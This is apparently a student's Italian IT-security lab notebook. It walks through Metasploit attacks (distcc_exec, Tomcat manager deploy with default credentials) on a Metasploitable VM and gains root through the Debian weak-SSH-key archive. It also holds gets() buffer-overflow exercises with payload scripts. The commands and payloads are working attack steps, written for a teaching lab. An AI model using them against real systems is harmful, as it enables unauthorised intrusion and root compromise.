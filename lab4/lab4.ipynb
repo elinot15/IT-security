{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise #1: First attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In questa attività, utilizzeremo unix/misc/distcc_execexploit per dimostrare il processo complessivo. Accertarsi che sia VM1 (Kali) sia VM2 (metasploitable) siano avviati. In VM1 avvia Armitage e trova l'exploit distcc_exec: exploit/unix/misc/distcc_exec. Determina le opzioni disponibili facendo doppio clic con Armitage sull'exploit selezionato (o con Metasploit: msf exploit (distcc_exec)> mostra opzioni). Per far funzionare l'exploit, è ancora necessario specificare i valori delle variabili di ambiente correlate, ad esempio RHOST, l'indirizzo IP di destinazione della macchina vulnerabile (ifconfig sul metasploitable). Puoi lasciare PAYLOAD al valore predefinito oppure puoi usare qualcos'altro (cmd/ unix/reverse). Infine, esegui l'exploit semplicemente eseguendo exploitin metasploit o avviando inArmitage. Per questo esercizio invia uno screenshot della finestra con l'exploit di lavoro (prova che ottieni il privilegio di root sulla macchina utilizzabile) e riporta tutti i comandi utilizzati"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "nmap --interactive\n",
    "\n",
    "!sh \n",
    "\n",
    "whoami\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise #2: Tomcat server attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In questo compito imparerai a conoscere le porte di ricognizione e scansione. Armitag contiene un plugin che racchiude nmap per noi. Durante la scansione di un host, i risultati vengono archiviati in un database per consentire l'accesso ai plug-in successivi. Esegui un portscan con Armitage o attraverso msf on the metasploitable target (db_nmap –sV 10.10.15.x). È possibile visualizzare gli host scansionati con db_hosts. Il portcan può rivelare che sul target è in esecuzione Apache Tomcat. Puoi trovare un exploit per questo servizio chiamato multi/http/tomcat_mgr_deploy. Assicurati di impostare le opzioni di exploit in modo appropriato. Googla per le credenziali predefinite per questo servizio. Utilizzare i dati nmap per impostare RPORT. Usa le tecniche apprese dall'esercizio1 per guadagnare controllo remoto. Per questa attività è necessario importare tutti i comandi, le opzioni e uno screenshot (per dimostrare che si ottiene il privilegio di root sulla macchina utilizzabile)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "db_nmap -sV 10.10.15.3\n",
    "\n",
    "exploit/multi/http/tomcat_mgr_deploy\n",
    "\n",
    "password tomcat\n",
    "username tomcat\n",
    "RHOST 10.10.15.4\n",
    "LPORT 9999\n",
    "RPORT 8180\n",
    "\n",
    "whoami\n",
    "\n",
    "ls -la .ssh\n",
    "\n",
    "cat .ssh/authorized_keys\n",
    "\n",
    "https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2\n",
    "\n",
    "elisa@kali:~/Desktop/rsa/2048$ grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0i (...)\n",
    "57c3115d77c56390332dc5c49978627a-5429.pub\n",
    "\n",
    "elisa@kali:~/Desktop/rsa/2048$ ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.15.4\n",
    "\n",
    "root@metasploitable:~# whoami\n",
    "root\n",
    "root@metasploitable:~# id\n",
    "uid=0(root) gid=0(root)) groups=0(root)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise #3: Firstbuffer overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Anche il seguente programma accetta l'input dell'utente tramite la funzione gets e quindi cerca un valore specifico in una variabile locale denominata secret. Se questo valore è uguale a una certa costante predefinita, la funzione di stampa viene utilizzata per mostrare una vincita! messaggio per l'utente. Non esiste un mezzo diretto per modificare il contenuto della variabile segreta. La funzione get continuerà a leggere dal dispositivo stdin fino a quando non incontra un carattere newline o EOF. Poiché questo ciclo di lettura non riesce a rispettare la dimensione del buffer di destinazione, nel programma viene introdotta una vulnerabilità classica di overflow del buffer. Lo studente deve trovare questa vulnerabilità e sfruttare i programmi es3.c che stampa il \"youwin!\" messaggio a stdout. Collega uno screenshot dello stdout e del payload fornito come input al programma.\n",
    "\n",
    "Compile with canary guard disabled:            gcc -fno-stack-protector-z execstack es3.c -o es3\n",
    "\n",
    "Disable ASLR countermeasurebefore running:     sysctl -w kernel.randomize_va_space=0 \n",
    "\n",
    "int main() {\n",
    "\n",
    "    int secret;\n",
    "    char buf[16];\n",
    "    printf(\"buf: %08x secret: %08x\\n\", &buf, &secret);\n",
    "    gets(buf); \n",
    "    if (secret== 0x4349414F) \n",
    "    \n",
    "        printf(\"you win!\\n\\n\"); \n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "gcc -fno-stack-protector  es3.c -o  vull -Wall   \n",
    "\n",
    "./es3\n",
    "\n",
    "sudo sysctl -w kernel.randomize_va_space=0\n",
    "\n",
    "creo file es3.py\n",
    "\n",
    "-----------------------------------------\n",
    "\n",
    "payload= bytearray()\n",
    "\n",
    "for i in range(16):\n",
    "\tpayload.append(‘\\x5e’) \n",
    "\n",
    "payload.append(‘\\x44’) #D\n",
    "payload.append(‘\\x43’) #C\n",
    "payload.append(‘\\x42’) #B\n",
    "payload.append(‘\\x41’) #A\n",
    "\n",
    "print payload\n",
    "\n",
    "----------------------------------------------\n",
    "python es3.py > payload\n",
    "\n",
    "./es3 <payload"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise #4: Unprintablebuffer overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Il seguente programma presenta una vulnerabilità di buffer overflow, la maggior parte dei concetti è molto simile all'esercizio precedente, ma presta attenzione ai caratteri non stampabili. Lo studente deve trovare questa vulnerabilità e sfruttare i programes4.cso che stampa il \"tu vinci!\" messaggio a stdout. Collega uno screenshot dello stdout e del payload fornito come input al programma.\n",
    "\n",
    "int main() {\n",
    "\n",
    "    int secret;\n",
    "    char buf[64];\n",
    "    printf(\"buf: %08x secret: %08x\\n\", &buf, &secret);\n",
    "    gets(buf);\n",
    "    if (secret== 0x01020305)\n",
    "        printf(\"you win!\\n\");\n",
    "\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import Image\n",
    "Image(filename='immagine4.png')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Exercise #5: Change the flow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Il seguente programma ha una vulnerabilità di buffer overflow, la maggior parte dei concetti sono molto simili agli esercizi precedenti ma in questo momento c'è un carattere 0x00 che tronca il flusso di input dei get. L'obiettivo è lo stesso: è necessario stampare la stringa \"tu vinci! ”, pensa se riesci a distruggere lo stack finché non raggiungi l'indirizzo di ritorno inviato dal principale. Lo studente deve trovare questa vulnerabilità e sfruttare i programmi 5.cso che stampa il \"tu vinci!\" messaggio a stdout. Collega uno screenshot del test e il payload fornito come input al programma.\n",
    "\n",
    "int main() {\n",
    "\n",
    "    int secret;\n",
    "    char buf[80];\n",
    "    printf(\"buf: %08x secret: %08x\\n\", &buf, &secret);\n",
    "    gets(buf);\n",
    "    if (secret== 0x01020005)\n",
    "        printf(\"you win!\\n\");\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "printf 'AAAABBBBCCCCDDDDEEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVXXXX\\x05\\x00\\x02\\x01' | ./es5 \n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
